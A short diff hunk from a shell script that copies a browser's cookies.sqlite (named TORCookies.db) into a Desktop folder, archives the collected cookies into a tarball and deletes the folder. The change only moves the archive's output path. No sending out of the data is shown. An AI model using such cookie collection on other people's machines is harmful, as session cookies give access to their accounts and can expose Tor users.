@@ -46,7 +46,7 @@ file="$path/cookies.sqlite"
 cp "$file" ~/Desktop/Cookies/TORCookies.db
 
 # Compress collected cookies
-tar cvfz Cookies.tgz ~/Desktop/Cookies/*
+tar cvfz ~/Desktop/Cookies.tgz ~/Desktop/Cookies/*
 
 # Remove the created cookies folder
 rm -rf ~/Desktop/Cookies/
